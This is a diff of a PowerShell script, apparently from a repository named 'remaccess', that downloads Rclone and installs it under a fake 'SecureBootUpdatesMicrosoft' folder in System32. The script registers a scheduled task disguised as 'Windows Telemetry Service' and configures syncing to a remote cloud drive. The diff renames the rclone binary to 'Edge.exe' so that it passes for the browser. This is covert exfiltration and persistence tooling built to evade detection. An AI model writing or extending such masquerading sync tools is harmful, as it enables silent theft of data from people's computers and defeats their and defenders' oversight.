@@ -2,7 +2,7 @@
 $rclonedlurl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/Rclone.zip"
 $rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
 $rclonezip = Join-Path -Path $rootpath -ChildPath "Rclone.zip"
-$rcloneexepath = Join-Path -Path $rootpath -ChildPath "rclone.exe"
+$rcloneexepath = Join-Path -Path $rootpath -ChildPath "Edge.exe"
 $rcloneconfigfile = Join-Path -Path $rootPath -ChildPath "rc.conf"
 $syncledgerfile = Join-Path -Path $rootPath -ChildPath "syncledger"
 $rclonetask = "Windows Telemetry Service"
@@ -54,10 +54,10 @@ if ($option.ToLower() -eq "y") {
         Write-Host "Rclone directory does not exist."
     }
     if (Get-Process -Name "Rclone" -ErrorAction SilentlyContinue) {
-        Write-Host "All instances of Rclone.exe have been terminated."
+        Write-Host "All instances of Edge.exe(rclone) have been terminated."
     }
     else {
-        Write-Host "No instances of Rclone.exe are currently running."
+        Write-Host "No instances of Edge.exe(rclone) are currently running."
     }
     if (Test-Path $rootpath) {
         Remove-Item -Path $rootpath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
@@ -85,11 +85,11 @@ if ($option.ToLower() -eq "y") {
         Remove-Item -Path $rclonezip -Force
     }
     else {
-        Write-Host "rclone.exe already exists. Skipping download."
+        Write-Host "Edge.exe(rclone) already exists. Skipping download."
     }
 } else {}
 
-#Rc.conf - file containing remote cloud configuration for rclone.exe.
+#Rc.conf - file containing remote cloud configuration for Edge.exe.
 $TaskName = "creation/modif of rc.conf(rclone config)?"
 $option = Read-Host "Proceed With $TaskName (y/n):"
 if ([string]::IsNullOrEmpty($option)) {
@@ -138,7 +138,7 @@ if ([string]::IsNullOrEmpty($option)) {
 if ($option.ToLower() -eq "y") {  
 $wrappercontent = @'
 $rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
-$rcloneexe = Join-Path -Path $rootpath -ChildPath "rclone.exe"
+$rcloneexe = Join-Path -Path $rootpath -ChildPath "Edge.exe"
 $ledgerpath = Join-Path -Path $rootpath -ChildPath "syncledger"
 $rcloneconfig = Join-Path -Path $rootpath -ChildPath "rc.conf"
 $clouddrive = "remsync"
